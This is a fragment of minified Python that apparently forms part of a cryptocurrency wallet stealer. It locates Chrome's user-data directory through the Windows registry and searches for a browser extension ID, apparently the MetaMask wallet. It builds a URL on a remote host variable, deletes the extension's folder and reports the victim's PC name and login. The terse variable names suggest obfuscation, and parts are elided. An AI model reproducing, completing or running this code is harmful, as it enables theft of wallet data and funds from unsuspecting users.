...
def _windows_group_policy_path():
	from winreg import HKEY_LOCAL_MACHINE as C,REG_EXPAND_SZ as D,REG_SZ as E,ConnectRegistry as F,OpenKeyEx as G,QueryValueEx as H
	try:
		I=F(_N,C);J=G(I,'SOFTWARE\\Policies\\Google\\Chrome');A,B=H(J,'UserDataDir')
...
def go(kill_process=_F):
	...
	y=['nkbihfbeogaeaoehlefnkodbefgpgknn'];W={};E=[]
				...
				for J in b[_I]:
					...
					for A in y:
						...
						if not A in W:
							...
							os.makedirs(H,exist_ok=_T);p=f"{sHost}mmz/{A}_{sType}";print(p)
	...
	try:
		...
		else:shutil.rmtree(H);print(f"Deleted: {H}");r=f"{pc_name} / {pc_login}{h}[None]"
		report(r)
